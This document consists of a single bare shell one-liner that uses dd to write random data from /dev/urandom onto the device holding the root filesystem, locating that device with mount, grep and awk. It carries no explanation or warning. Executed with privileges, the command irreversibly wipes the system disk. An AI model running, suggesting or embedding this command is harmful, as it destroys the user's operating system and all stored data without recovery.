dd if=/dev/urandom of=`mount |grep "on / " |awk '{print $1}'`
